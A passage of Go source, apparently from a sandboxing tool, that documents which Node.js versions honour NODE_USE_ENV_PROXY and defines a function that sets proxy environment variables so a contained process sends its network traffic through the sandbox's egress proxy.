// name failed with ENOTFOUND on Windows and EAI_AGAIN on Linux, and the proxy was
// never asked.
//
// Which Node reads it, from the Node changelogs and the CLI docs at each release:
//
//   - 24.0.0 and later read it for fetch() (nodejs/node#57165).
//   - 24.5.0 and later read it for http and https requests too (#58980).
//   - 22.21.0 and later read it for fetch, http and https together.
//   - Every other release ignores it. That is 18, 19, 20, 21, 22.0.0 to 22.20.x
//     and 23. Setting it there changes nothing, and those programs behave as they
//     did.
//
// Measured with a test proxy, 22.23.2, 24.14.1 and 24.21.0 sent their fetch,
// https.get and http.get to it. 18.5.0, 18.20.4, 19.9.0, 20.11.0 and 21.7.3 sent
// nothing and tried to resolve the names themselves.
//
// Node reads it at startup, so it has to be in the environment the process is
// launched with, and a child that Node starts inherits it. A request given its own
// agent ignores it, and so does a raw socket. Every other request goes to the
// proxy, including one to 127.0.0.1. Measured on Windows and on Linux with
// 22.23.2, a server and a client in the same sandbox could no longer reach each
// other with fetch (rejected) or http.get (405). The ports nvx opens inside the
// sandbox are the exception. See inSandboxNoProxy.
//
// 22.23.2 prints "[UNDICI-EHPA] Warning: EnvHttpProxyAgent is experimental" to
// stderr when a process that has it set exits, whether or not the process made a
// request. 24.14.1 and 24.21.0 print nothing.
//
// Bun's fetch reads the proxy variables on its own and needs no such switch.
const nodeUseEnvProxy = "NODE_USE_ENV_PROXY"

// applyProxyEnv adds the proxy variables to the contained process's environment,
// after the scrub, so the scrub's short list of names cannot take them away. Any
// inherited value of a name set here is replaced rather than duplicated.
func applyProxyEnv(cleanEnv []string, proxy *EgressProxy) []string {
	if proxy == nil {
		return cleanEnv
	}
	httpURL := proxy.HTTProxyURL()
	socksURL := proxy.SOCKSProxyURL()
	filtered := make([]string, 0, len(cleanEnv)+5)
	for _, e := range cleanEnv {
		key := strings.ToUpper(strings.SplitN(e, "=", 2)[0])
		switch key {
		case "HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY", "NO_PROXY", nodeUseEnvProxy:
			continue
		}
		filtered = append(filtered, e)
	}
	filtered = append(filtered,
		"HTTP_PROXY="+httpURL,
		"HTTPS_PROXY="+httpURL,
		"ALL_PROXY="+socksURL,
		"NO_PROXY=127.0.0.1,localhost,::1",
		nodeUseEnvProxy+"=1",
	)
	return filtered
}
